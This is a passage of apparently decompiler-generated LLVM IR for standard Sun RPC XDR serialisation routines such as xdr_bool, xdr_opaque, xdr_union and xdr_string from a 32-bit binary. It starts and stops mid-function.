  store i8 %v2_80570fe, i8* %stack_var_-8, align 1
  %v2_8057105 = ptrtoint i8* %stack_var_-8 to i32
  %v2_805710e = call i32 @__GI_xdr_int(i32 %arg1, i32 %v2_8057105)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057118 = icmp eq i32 %v2_805710e, 0
  br i1 %v1_8057118, label %dec_label_pc_8057124, label %dec_label_pc_805711c

dec_label_pc_805711c:                             ; preds = %entry
  %v3_805711c = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8057122 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8057122 = inttoptr i32 %v2_8057122 to i8*
  store i8 %v3_805711c, i8* %v3_8057122, align 1
  %v0_8057127.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057124

dec_label_pc_8057124:                             ; preds = %entry, %dec_label_pc_805711c
  %v0_8057127 = phi i32 [ 0, %entry ], [ %v0_8057127.pre, %dec_label_pc_805711c ]
  %v2_8057129 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057129, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057127

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8057124, { 1, 0 }
}

define i32 @xdr_u_char(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i8, align 1
  %v2_8057133 = load i8, i8* %tmp7, align 1
  store i8 %v2_8057133, i8* %stack_var_-8, align 1
  %v2_805713a = ptrtoint i8* %stack_var_-8 to i32
  store i32 %v2_805713a, i32* @eax, align 4
  %v5_8057143 = call i32 @xdr_u_long(i32* %arg1, i32 %v2_805713a)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_805714d = icmp eq i32 %v5_8057143, 0
  br i1 %v1_805714d, label %dec_label_pc_8057159, label %dec_label_pc_8057151

dec_label_pc_8057151:                             ; preds = %entry
  %v3_8057151 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8057157 = load i32, i32* @ebx, align 4
  %v3_8057157 = inttoptr i32 %v2_8057157 to i8*
  store i8 %v3_8057151, i8* %v3_8057157, align 1
  %v0_805715c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057159

dec_label_pc_8057159:                             ; preds = %entry, %dec_label_pc_8057151
  %v0_805715c = phi i32 [ 0, %entry ], [ %v0_805715c.pre, %dec_label_pc_8057151 ]
  ret i32 %v0_805715c

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057159, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_805716c = load i32, i32* %arg1, align 4
  %v9_805716e = icmp eq i32 %v2_805716c, 1
  br i1 %v9_805716e, label %dec_label_pc_80571a0, label %dec_label_pc_8057173

dec_label_pc_8057173:                             ; preds = %entry
  %v5_805716e = icmp eq i32 %v2_805716c, 0
  br i1 %v5_805716e, label %dec_label_pc_8057181, label %dec_label_pc_8057175

dec_label_pc_8057175:                             ; preds = %dec_label_pc_8057173
  %v9_8057175 = icmp eq i32 %v2_805716c, 2
  br i1 %v9_8057175, label %dec_label_pc_80571c9, label %dec_label_pc_80571c7

dec_label_pc_8057181:                             ; preds = %dec_label_pc_8057173
  %v1_8057183 = inttoptr i32 %arg2 to i32*
  %v2_8057183 = load i32, i32* %v1_8057183, align 4
  %v3_8057183 = icmp eq i32 %v2_8057183, 0
  %v1_8057186 = icmp eq i1 %v3_8057183, false
  %v2_8057186 = zext i1 %v1_8057186 to i32
  store i32 %v2_8057186, i32* %stack_var_-8, align 4
  %v1_805718f = add i32 %tmp6, 4
  %v2_805718f = inttoptr i32 %v1_805718f to i32*
  %v3_805718f = load i32, i32* %v2_805718f, align 4
  %v2_8057192 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8057198 = add i32 %v3_805718f, 4
  %v6_8057198 = inttoptr i32 %v5_8057198 to i32*
  %v7_8057198 = load i32, i32* %v6_8057198, align 4
  call void @__pseudo_call(i32 %v7_8057198)
  br label %dec_label_pc_80571c9

dec_label_pc_80571a0:                             ; preds = %entry
  %v1_80571a2 = add i32 %tmp6, 4
  %v2_80571a2 = inttoptr i32 %v1_80571a2 to i32*
  %v3_80571a2 = load i32, i32* %v2_80571a2, align 4
  %v5_80571ab = inttoptr i32 %v3_80571a2 to i32*
  %v6_80571ab = load i32, i32* %v5_80571ab, align 4
  call void @__pseudo_call(i32 %v6_80571ab)
  %v1_80571b0 = icmp eq i32 %v3_80571a2, 0
  br i1 %v1_80571b0, label %dec_label_pc_80571c7, label %dec_label_pc_80571b4

dec_label_pc_80571b4:                             ; preds = %dec_label_pc_80571a0
  %v4_80571b6 = icmp eq i32 %tmp, 0
  %v1_80571bb = icmp eq i1 %v4_80571b6, false
  %v2_80571bb = zext i1 %v1_80571bb to i32
  %v1_80571be = load i32, i32* %ebx.global-to-local, align 4
  %v2_80571be = inttoptr i32 %v1_80571be to i32*
  store i32 %v2_80571bb, i32* %v2_80571be, align 4
  br label %dec_label_pc_80571c9

dec_label_pc_80571c7:                             ; preds = %dec_label_pc_8057175, %dec_label_pc_80571a0
  br label %dec_label_pc_80571c9

dec_label_pc_80571c9:                             ; preds = %dec_label_pc_8057175, %dec_label_pc_80571b4, %dec_label_pc_8057181, %dec_label_pc_80571c7
  %v0_80571cd = phi i32 [ 1, %dec_label_pc_8057175 ], [ 1, %dec_label_pc_80571b4 ], [ %v2_8057192, %dec_label_pc_8057181 ], [ 0, %dec_label_pc_80571c7 ]
  %v2_80571cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80571cc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80571cd

; uselistorder directives
  uselistorder i32 %v2_805716c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80571c9, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80571c7, { 1, 0 }
}

define i32 @xdr_enum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80571ce = call i32 @__GI_xdr_long()
  ret i32 %v0_80571ce
}

define i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80571d4 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_80571e4 = icmp eq i32 %tmp, 0
  br i1 %v1_80571e4, label %dec_label_pc_805726d, label %dec_label_pc_80571e8

dec_label_pc_80571e8:                             ; preds = %entry
  %v1_80571ec = urem i32 %tmp, 4
  %v2_80571ec = icmp eq i32 %v1_80571ec, 0
  br i1 %v2_80571ec, label %dec_label_pc_80571f7, label %dec_label_pc_80571f1

dec_label_pc_80571f1:                             ; preds = %dec_label_pc_80571e8
  %v2_80571f5 = sub nsw i32 4, %v1_80571ec
  br label %dec_label_pc_80571f7

dec_label_pc_80571f7:                             ; preds = %dec_label_pc_80571e8, %dec_label_pc_80571f1
  %storemerge13 = phi i32 [ %v2_80571f5, %dec_label_pc_80571f1 ], [ 0, %dec_label_pc_80571e8 ]
  store i32 %storemerge13, i32* %esi.global-to-local, align 4
  %v1_80571f7 = inttoptr i32 %arg2 to i32*
  %v2_80571f7 = load i32, i32* %v1_80571f7, align 4
  %v9_80571f9 = icmp eq i32 %v2_80571f7, 1
  br i1 %v9_80571f9, label %dec_label_pc_8057207, label %dec_label_pc_80571fe

dec_label_pc_80571fe:                             ; preds = %dec_label_pc_80571f7
  %v5_80571f9 = icmp eq i32 %v2_80571f7, 0
  br i1 %v5_80571f9, label %dec_label_pc_8057234, label %dec_label_pc_8057200

dec_label_pc_8057200:                             ; preds = %dec_label_pc_80571fe
  %v9_8057200 = icmp eq i32 %v2_80571f7, 2
  %v1_8057203 = icmp eq i1 %v9_8057200, false
  br i1 %v1_8057203, label %dec_label_pc_805726b, label %dec_label_pc_805726d

dec_label_pc_8057207:                             ; preds = %dec_label_pc_80571f7
  %v1_8057208 = add i32 %arg2, 4
  %v2_8057208 = inttoptr i32 %v1_8057208 to i32*
  %v3_8057208 = load i32, i32* %v2_8057208, align 4
  %v5_805720e = add i32 %v3_8057208, 8
  %v6_805720e = inttoptr i32 %v5_805720e to i32*
  %v7_805720e = load i32, i32* %v6_805720e, align 4
  call void @__pseudo_call(i32 %v7_805720e)
  %v1_8057214 = icmp eq i32 %v3_8057208, 0
  br i1 %v1_8057214, label %dec_label_pc_805726b, label %dec_label_pc_8057218

dec_label_pc_8057218:                             ; preds = %dec_label_pc_8057207
  %v0_8057218 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057218 = icmp eq i32 %v0_8057218, 0
  br i1 %v1_8057218, label %dec_label_pc_805726d, label %dec_label_pc_805721c

dec_label_pc_805721c:                             ; preds = %dec_label_pc_8057218
  %v0_805721c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805721c = add i32 %v0_805721c, 4
  %v2_805721c = inttoptr i32 %v1_805721c to i32*
  %v3_805721c = load i32, i32* %v2_805721c, align 4
  %v1_805722f = add i32 %v3_805721c, 8
  br label %dec_label_pc_805725f

dec_label_pc_8057234:                             ; preds = %dec_label_pc_80571fe
  %v1_8057235 = add i32 %arg2, 4
  %v2_8057235 = inttoptr i32 %v1_8057235 to i32*
  %v3_8057235 = load i32, i32* %v2_8057235, align 4
  %v5_805723b = add i32 %v3_8057235, 12
  %v6_805723b = inttoptr i32 %v5_805723b to i32*
  %v7_805723b = load i32, i32* %v6_805723b, align 4
  call void @__pseudo_call(i32 %v7_805723b)
  %v1_8057241 = icmp eq i32 %v3_8057235, 0
  br i1 %v1_8057241, label %dec_label_pc_805726b, label %dec_label_pc_8057245

dec_label_pc_8057245:                             ; preds = %dec_label_pc_8057234
  %v0_8057245 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057245 = icmp eq i32 %v0_8057245, 0
  br i1 %v1_8057245, label %dec_label_pc_805726d, label %dec_label_pc_8057249

dec_label_pc_8057249:                             ; preds = %dec_label_pc_8057245
  %v0_8057249 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057249 = add i32 %v0_8057249, 4
  %v2_8057249 = inttoptr i32 %v1_8057249 to i32*
  %v3_8057249 = load i32, i32* %v2_8057249, align 4
  %v1_805725c = add i32 %v3_8057249, 12
  br label %dec_label_pc_805725f

dec_label_pc_805725f:                             ; preds = %dec_label_pc_805721c, %dec_label_pc_8057249
  %stack_var_0.0 = phi i32 [ %v0_805721c, %dec_label_pc_805721c ], [ %v0_8057249, %dec_label_pc_8057249 ]
  %storemerge1.in.in = phi i32 [ %v1_805722f, %dec_label_pc_805721c ], [ %v1_805725c, %dec_label_pc_8057249 ]
  %stack_var_4.0 = phi i32 [ ptrtoint (i32* @global_var_806777c.309 to i32), %dec_label_pc_805721c ], [ ptrtoint (i32* @global_var_805cf5d.310 to i32), %dec_label_pc_8057249 ]
  %storemerge1.in = inttoptr i32 %storemerge1.in.in to i32*
  %storemerge1 = load i32, i32* %storemerge1.in, align 4
  store i32 %storemerge1, i32* @ecx, align 4
  %v2_8057260 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057260, i32* %ebx.global-to-local, align 4
  store i32 %v0_80571d4, i32* %esi.global-to-local, align 4
  call void @__pseudo_branch(i32 %storemerge1)
  br label %dec_label_pc_805726d

dec_label_pc_805726b:                             ; preds = %dec_label_pc_8057234, %dec_label_pc_8057207, %dec_label_pc_8057200
  br label %dec_label_pc_805726d

dec_label_pc_805726d:                             ; preds = %dec_label_pc_805725f, %entry, %dec_label_pc_8057218, %dec_label_pc_8057245, %dec_label_pc_8057200, %dec_label_pc_805726b
  %stack_var_0.1 = phi i32 [ %arg1, %entry ], [ %arg1, %dec_label_pc_805726b ], [ %arg1, %dec_label_pc_8057218 ], [ %stack_var_0.0, %dec_label_pc_805725f ], [ %arg1, %dec_label_pc_8057245 ], [ %arg1, %dec_label_pc_8057200 ]
  %stack_var_4.1 = phi i32 [ %arg2, %entry ], [ %arg2, %dec_label_pc_805726b ], [ %arg2, %dec_label_pc_8057218 ], [ %stack_var_4.0, %dec_label_pc_805725f ], [ %arg2, %dec_label_pc_8057245 ], [ %arg2, %dec_label_pc_8057200 ]
  %storemerge = phi i32 [ 1, %entry ], [ 0, %dec_label_pc_805726b ], [ 1, %dec_label_pc_8057218 ], [ 1, %dec_label_pc_805725f ], [ 1, %dec_label_pc_8057245 ], [ 1, %dec_label_pc_8057200 ]
  store i32 %stack_var_0.1, i32* @ebx, align 4
  store i32 %stack_var_4.1, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80571f7, { 0, 2, 1 }
  uselistorder i32 %v1_80571ec, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 4, 6, 5, 7, 8 }
  uselistorder label %dec_label_pc_805726d, { 5, 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_805725f, { 1, 0 }
  uselistorder label %dec_label_pc_80571f7, { 1, 0 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8057271 = load i32, i32* @ebp, align 4
  %v0_8057272 = load i32, i32* @edi, align 4
  %v0_8057274 = load i32, i32* @ebx, align 4
  store i32 %v0_8057274, i32* %stack_var_-16, align 4
  store i32 %tmp11, i32* %edi.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_8057292 = call i32 @xdr_enum(i32 %arg1, i32 %tmp11)
  %v1_805729a = icmp eq i32 %v2_8057292, 0
  br i1 %v1_805729a, label %dec_label_pc_80572e9, label %dec_label_pc_805729e

dec_label_pc_805729e:                             ; preds = %entry
  %v0_805729e = load i32, i32* %edi.global-to-local, align 4
  %v1_805729e = inttoptr i32 %v0_805729e to i32*
  %v2_805729e = load i32, i32* %v1_805729e, align 4
  %v0_80572bf.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80572bf23 = add i32 %v0_80572bf.pre, 4
  %v2_80572bf24 = inttoptr i32 %v1_80572bf23 to i32*
  %v3_80572bf25 = load i32, i32* %v2_80572bf24, align 4
  store i32 %v3_80572bf25, i32* @ecx, align 4
  %v1_80572c226 = icmp eq i32 %v3_80572bf25, 0
  %v1_80572c427 = icmp eq i1 %v1_80572c226, false
  br i1 %v1_80572c427, label %dec_label_pc_80572a2, label %dec_label_pc_80572c6

dec_label_pc_80572a2:                             ; preds = %dec_label_pc_805729e, %dec_label_pc_80572bc
  %v3_80572bf29 = phi i32 [ %v3_80572bf, %dec_label_pc_80572bc ], [ %v3_80572bf25, %dec_label_pc_805729e ]
  %v0_80572bc28 = phi i32 [ %v1_80572bc, %dec_label_pc_80572bc ], [ %v0_80572bf.pre, %dec_label_pc_805729e ]
  %v1_80572a2 = inttoptr i32 %v0_80572bc28 to i32*
  %v2_80572a2 = load i32, i32* %v1_80572a2, align 4
  %v14_80572a2 = icmp eq i32 %v2_80572a2, %v2_805729e
  %v1_80572a4 = icmp eq i1 %v14_80572a2, false
  br i1 %v1_80572a4, label %dec_label_pc_80572bc, label %dec_label_pc_80572a6

dec_label_pc_80572a6:                             ; preds = %dec_label_pc_80572a2
  br label %dec_label_pc_80572e0

dec_label_pc_80572bc:                             ; preds = %dec_label_pc_80572a2
  %v1_80572bc = add i32 %v0_80572bc28, 8
  store i32 %v1_80572bc, i32* %ebx.global-to-local, align 4
  %v1_80572bf = add i32 %v0_80572bc28, 12
  %v2_80572bf = inttoptr i32 %v1_80572bf to i32*
  %v3_80572bf = load i32, i32* %v2_80572bf, align 4
  store i32 %v3_80572bf, i32* @ecx, align 4
  %v1_80572c2 = icmp eq i32 %v3_80572bf, 0
  %v1_80572c4 = icmp eq i1 %v1_80572c2, false
  br i1 %v1_80572c4, label %dec_label_pc_80572a2, label %dec_label_pc_80572c6

dec_label_pc_80572c6:                             ; preds = %dec_label_pc_80572bc, %dec_label_pc_805729e
  %v1_80572c6 = icmp eq i32 %arg5, 0
  br i1 %v1_80572c6, label %dec_label_pc_80572e9, label %dec_label_pc_80572ca

dec_label_pc_80572ca:                             ; preds = %dec_label_pc_80572c6
  store i32 %arg5, i32* @ecx, align 4
  br label %dec_label_pc_80572e0

dec_label_pc_80572e0:                             ; preds = %dec_label_pc_80572a6, %dec_label_pc_80572ca
  %v0_80572e7 = phi i32 [ %v3_80572bf29, %dec_label_pc_80572a6 ], [ %arg5, %dec_label_pc_80572ca ]
  %v2_80572e3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80572e3, i32* %ebx.global-to-local, align 4
  store i32 %v0_8057272, i32* %edi.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80572e7)
  br label %dec_label_pc_80572e9

dec_label_pc_80572e9:                             ; preds = %dec_label_pc_80572c6, %entry, %dec_label_pc_80572e0
  %v2_80572ee = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80572ee, i32* %ebx.global-to-local, align 4
  store i32 %v0_8057272, i32* @edi, align 4
  store i32 %v0_8057271, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_80572bf, { 1, 2, 0 }
  uselistorder i32 %v1_80572bc, { 1, 0 }
  uselistorder i32 %v0_80572bc28, { 0, 2, 1 }
  uselistorder i32 %v0_8057272, { 1, 0 }
  uselistorder void (i32)* @__pseudo_branch, { 3, 5, 6, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32)* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder i32 %arg5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80572e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80572e0, { 1, 0 }
  uselistorder label %dec_label_pc_80572a2, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp16 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80572f3 = load i32, i32* @edi, align 4
  %v0_80572f4 = load i32, i32* @esi, align 4
  %v0_80572f5 = load i32, i32* @ebx, align 4
  store i32 %tmp16, i32* @esi, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_8057301 = load i32, i32* %arg1, align 4
  store i32 %v2_8057301, i32* %eax.global-to-local, align 4
  %v1_8057303 = inttoptr i32 %arg2 to i32*
  %v2_8057303 = load i32, i32* %v1_8057303, align 4
  %v1_8057305 = icmp eq i32 %v2_8057301, 0
  br i1 %v1_8057305, label %dec_label_pc_8057317, label %dec_label_pc_8057309

dec_label_pc_8057309:                             ; preds = %entry
  %v9_8057309 = icmp eq i32 %v2_8057301, 2
  %v1_805730c = icmp eq i1 %v9_8057309, false
  br i1 %v1_805730c, label %dec_label_pc_8057309.dec_label_pc_805732f_crit_edge, label %dec_label_pc_805730e

dec_label_pc_8057309.dec_label_pc_805732f_crit_edge: ; preds = %dec_label_pc_8057309
  br label %dec_label_pc_805732f

dec_label_pc_805730e:                             ; preds = %dec_label_pc_8057309
  %v1_805730e = icmp eq i32 %v2_8057303, 0
  %v1_8057310 = icmp eq i1 %v1_805730e, false
  br i1 %v1_8057310, label %dec_label_pc_805731f, label %dec_label_pc_80573c1

dec_label_pc_8057317:                             ; preds = %entry
  %v1_8057317 = icmp eq i32 %v2_8057303, 0
  br i1 %v1_8057317, label %dec_label_pc_80573c8, label %dec_label_pc_805731f

dec_label_pc_805731f:                             ; preds = %dec_label_pc_8057317, %dec_label_pc_805730e
  %v5_8057322 = inttoptr i32 %v2_8057303 to i8*
  %v3_8057323 = call i32 @strlen(i8* %v5_8057322)
  store i32 %v3_8057323, i32* %eax.global-to-local, align 4
  store i32 %v3_8057323, i32* %stack_var_-16, align 4
  %v0_8057336.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805732f

dec_label_pc_805732f:                             ; preds = %dec_label_pc_8057309.dec_label_pc_805732f_crit_edge, %dec_label_pc_805731f
  %v0_8057336 = phi i32 [ %tmp16, %dec_label_pc_8057309.dec_label_pc_805732f_crit_edge ], [ %v0_8057336.pre, %dec_label_pc_805731f ]
  %v2_8057331 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8057331, i32* @eax, align 4
  %tmp27 = inttoptr i32 %v0_8057336 to i32*
  %v6_8057337 = call i32 @xdr_u_long(i32* %tmp27, i32 %v2_8057331)
  store i32 %v6_8057337, i32* %eax.global-to-local, align 4
  %v1_805733f = icmp eq i32 %v6_8057337, 0
  br i1 %v1_805733f, label %dec_label_pc_80573c8, label %dec_label_pc_8057347

dec_label_pc_8057347:                             ; preds = %dec_label_pc_805732f
  %v3_8057347 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_8057347, i32* %eax.global-to-local, align 4
  %v6_805734f = icmp ugt i32 %v3_8057347, %arg3
  br i1 %v6_805734f, label %dec_label_pc_80573c8, label %dec_label_pc_8057351

dec_label_pc_8057351:                             ; preds = %dec_label_pc_8057347
  %v0_8057351 = load i32, i32* @esi, align 4
  %v1_8057351 = inttoptr i32 %v0_8057351 to i32*
  %v2_8057351 = load i32, i32* %v1_8057351, align 4
  %v9_8057353 = icmp eq i32 %v2_8057351, 1
  br i1 %v9_8057353, label %dec_label_pc_8057361, label %dec_label_pc_8057358

dec_label_pc_8057358:                             ; preds = %dec_label_pc_8057351
  %v5_8057353 = icmp eq i32 %v2_8057351, 0
  br i1 %v5_8057353, label %dec_label_pc_805739a, label %dec_label_pc_805735a

dec_label_pc_805735a:                             ; preds = %dec_label_pc_8057358
  %v9_805735a = icmp eq i32 %v2_8057351, 2
  %v1_805735d = icmp eq i1 %v9_805735a, false
  br i1 %v1_805735d, label %dec_label_pc_80573c8, label %dec_label_pc_80573ab

dec_label_pc_8057361:                             ; preds = %dec_label_pc_8057351
  %v1_8057361 = add i32 %v3_8057347, 1
  %v8_8057361 = icmp eq i32 %v1_8057361, 0
  store i32 %v1_8057361, i32* %eax.global-to-local, align 4
  br i1 %v8_8057361, label %dec_label_pc_80573c1, label %dec_label_pc_8057364

dec_label_pc_8057364:                             ; preds = %dec_label_pc_8057361
  %v0_8057364 = load i32, i32* @ebx, align 4
  %v1_8057364 = icmp eq i32 %v0_8057364, 0
  %v1_8057366 = icmp eq i1 %v1_8057364, false
  br i1 %v1_8057366, label %dec_label_pc_8057392, label %dec_label_pc_8057368

dec_label_pc_8057368:                             ; preds = %dec_label_pc_8057364
  %v2_805736c = call i32 @malloc(i32 %v1_8057361)
  store i32 %v2_805736c, i32* %eax.global-to-local, align 4
  %v1_8057374 = icmp eq i32 %v2_805736c, 0
  store i32 %v2_805736c, i32* @ebx, align 4
  %v1_8057378 = load i32, i32* @edi, align 4
  %v2_8057378 = inttoptr i32 %v1_8057378 to i32*
  store i32 %v2_805736c, i32* %v2_8057378, align 4
  %v1_805737a = icmp eq i1 %v1_8057374, false
  br i1 %v1_805737a, label %dec_label_pc_8057368.dec_label_pc_8057392_crit_edge, label %dec_label_pc_805737c

dec_label_pc_8057368.dec_label_pc_8057392_crit_edge: ; preds = %dec_label_pc_8057368
  %v3_8057392.pre = load i32, i32* %stack_var_-16, align 4
  %v0_8057396.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057392

dec_label_pc_805737c:                             ; preds = %dec_label_pc_8057368
  %v0_805737e = load i32, i32* @global_var_8062b70, align 16
  %v3_8057389 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_805cf28.311 to i32), i32 %v0_805737e)
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80573a6

dec_label_pc_8057392:                             ; preds = %dec_label_pc_8057368.dec_label_pc_8057392_crit_edge, %dec_label_pc_8057364
  %v0_8057396 = phi i32 [ %v0_8057396.pre, %dec_label_pc_8057368.dec_label_pc_8057392_crit_edge ], [ %v0_8057364, %dec_label_pc_8057364 ]
  %v3_8057392 = phi i32 [ %v3_8057392.pre, %dec_label_pc_8057368.dec_label_pc_8057392_crit_edge ], [ %v3_8057347, %dec_label_pc_8057364 ]
  store i32 %v3_8057392, i32* %eax.global-to-local, align 4
  %v2_8057396 = add i32 %v3_8057392, %v0_8057396
  %v3_8057396 = inttoptr i32 %v2_8057396 to i8*
  store i8 0, i8* %v3_8057396, align 1
  %v3_805739b.pre = load i32, i32* %stack_var_-16, align 4
  %v0_80573a0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805739a

dec_label_pc_805739a:                             ; preds = %dec_label_pc_8057358, %dec_label_pc_8057392
  %v0_80573a0 = phi i32 [ %v0_8057351, %dec_label_pc_8057358 ], [ %v0_80573a0.pre, %dec_label_pc_8057392 ]
  %v3_805739b = phi i32 [ %v3_8057347, %dec_label_pc_8057358 ], [ %v3_805739b.pre, %dec_label_pc_8057392 ]
  %v0_805739f = load i32, i32* @ebx, align 4
  %v5_80573a1 = call i32 @xdr_opaque(i32 %v0_80573a0, i32 %v0_805739f, i32 %v3_805739b)
  store i32 %v5_80573a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80573a6

dec_label_pc_80573a6:                             ; preds = %dec_label_pc_80573ab, %dec_label_pc_805737c, %dec_label_pc_805739a
  %v0_80573d0.pre = phi i32 [ %v0_80573d0.pre.pre, %dec_label_pc_80573ab ], [ 0, %dec_label_pc_805737c ], [ %v5_80573a1, %dec_label_pc_805739a ]
  br label %dec_label_pc_80573ca

dec_label_pc_80573ab:                             ; preds = %dec_label_pc_805735a
  %v0_80573ae = load i32, i32* @ebx, align 4
  %v2_80573af = call i32 @free(i32 %v0_80573ae)
  store i32 1, i32* %eax.global-to-local, align 4
  %v0_80573b9 = load i32, i32* @edi, align 4
  %v1_80573b9 = inttoptr i32 %v0_80573b9 to i32*
  store i32 0, i32* %v1_80573b9, align 4
  %v0_80573d0.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80573a6

dec_label_pc_80573c1:                             ; preds = %dec_label_pc_805730e, %dec_label_pc_8057361
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80573ca

dec_label_pc_80573c8:                             ; preds = %dec_label_pc_805735a, %dec_label_pc_8057347, %dec_label_pc_805732f, %dec_label_pc_8057317
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80573ca

dec_label_pc_80573ca:                             ; preds = %dec_label_pc_80573c1, %dec_label_pc_80573a6, %dec_label_pc_80573c8
  %v0_80573d0 = phi i32 [ 1, %dec_label_pc_80573c1 ], [ %v0_80573d0.pre, %dec_label_pc_80573a6 ], [ 0, %dec_label_pc_80573c8 ]
  store i32 %v0_80572f5, i32* @ebx, align 4
  store i32 %v0_80572f4, i32* @esi, align 4
  store i32 %v0_80572f3, i32* @edi, align 4
  ret i32 %v0_80573d0

; uselistorder directives
  uselistorder i32 %v2_805736c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8057351, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80573ca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80573c1, { 1, 0 }
  uselistorder label %dec_label_pc_80573a6, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805739a, { 1, 0 }
  uselistorder label %dec_label_pc_805732f, { 1, 0 }
}

define i32 @xdr_wrapstring(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_80573de = inttoptr i32 %arg1 to i32*
  %v4_80573de = call i32 @__GI_xdr_string(i32* %v3_80573de, i32 %arg2, i32 -1)
  %v1_80573e3 = icmp eq i32 %v4_80573de, 0
  %v1_80573e5 = icmp eq i1 %v1_80573e3, false
  %v2_80573e5 = zext i1 %v1_80573e5 to i32
  ret i32 %v2_80573e5
}

define i32 @xdr_bytes(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80573ef = load i32, i32* @ebp, align 4
  %v0_80573f0 = load i32, i32* @edi, align 4
  %v0_80573f1 = load i32, i32* @esi, align 4
  %v0_80573f2 = load i32, i32* @ebx, align 4
  store i32 %v0_80573f2, i32* %stack_var_-16, align 4
  store i32 %arg4, i32* @eax, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %tmp10, i32* @edi, align 4
  %v6_805740f = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  store i32 %v6_805740f, i32* %eax.global-to-local, align 4
  %v1_8057417 = icmp eq i32 %v6_805740f, 0
